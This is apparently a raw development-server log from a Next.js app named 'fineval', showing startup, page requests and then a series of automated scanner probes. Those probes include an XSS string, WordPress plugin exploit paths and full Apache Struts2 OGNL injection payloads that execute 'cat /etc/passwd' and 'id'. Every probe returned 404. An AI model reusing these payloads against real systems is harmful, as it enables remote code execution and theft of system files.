
> fineval@0.1.0 dev
> next dev -p 10005 --turbopack

   ▲ Next.js 15.3.4 (Turbopack)
   - Local:        http://localhost:10005
   - Network:      http://172.18.0.2:10005
   - Environments: .env.local

 ✓ Starting...
Slow filesystem detected. If /new1/whh01/llmtest/.next is a network drive, consider moving it to a local folder. If you have an antivirus enabled, consider excluding your project directory.
 ✓ Ready in 2s
 ○ Compiling / ...
 ✓ Compiled / in 4.3s
 GET / 200 in 4706ms
 ⚠ Cross origin request detected from fineval.top to /_next/* resource. In a future major version of Next.js, you will need to explicitly configure "allowedDevOrigins" in next.config to allow this.
Read more: https://nextjs.org/docs/app/api-reference/config/next-config-js/allowedDevOrigins
 ○ Compiling /favicon.ico ...
 ✓ Compiled /favicon.ico in 813ms
 GET /favicon.ico?favicon.45db1c09.ico 200 in 1091ms
 ○ Compiling /evaluate ...
 ✓ Compiled /evaluate in 1794ms
 GET /evaluate 200 in 2312ms
 GET / 200 in 105ms
 GET / 200 in 88ms
 GET /favicon.ico?favicon.45db1c09.ico 200 in 228ms
 GET / 200 in 104ms
 ⚠ Cross origin request detected from 166.111.111.128 to /_next/* resource. In a future major version of Next.js, you will need to explicitly configure "allowedDevOrigins" in next.config to allow this.
Read more: https://nextjs.org/docs/app/api-reference/config/next-config-js/allowedDevOrigins
 GET /favicon.ico?favicon.45db1c09.ico 200 in 228ms
 GET /evaluate 200 in 3847ms
 GET /evaluate 200 in 479ms
 GET /evaluate 200 in 705ms
 GET / 200 in 91ms
 GET /favicon.ico?favicon.45db1c09.ico 200 in 229ms
 GET / 200 in 172ms
 GET /favicon.ico 200 in 228ms
 GET / 200 in 412ms
 GET /favicon.ico?favicon.45db1c09.ico 200 in 433ms
 ○ Compiling /_not-found/page ...
 ✓ Compiled /_not-found/page in 2.3s
 GET /robots.txt 404 in 7969ms
 GET /sitemap.xml 404 in 196ms
 GET /config.json 404 in 308ms
 GET / 200 in 92ms
 POST /wp-content/plugins/delightful-downloads/assets/vendor/jqueryFileTree/connectors/jqueryFileTree.php 404 in 231ms
 POST /?q=node&destination=node 200 in 84ms
 POST /mobile/plugin/browser.jsp 404 in 329ms
 GET /wp-content/plugins/dhtmlxspreadsheet/codebase/spreadsheet.php?page=%3Cscript%3Ealert(document.domain)%3C/script%3E 404 in 871ms
 GET /index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=cat%20/etc/passwd 404 in 755ms
 POST /axis2-admin/login 404 in 75ms
 GET /index.action?redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D 404 in 204ms
 GET /index.action?redirectAction%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D 404 in 207ms
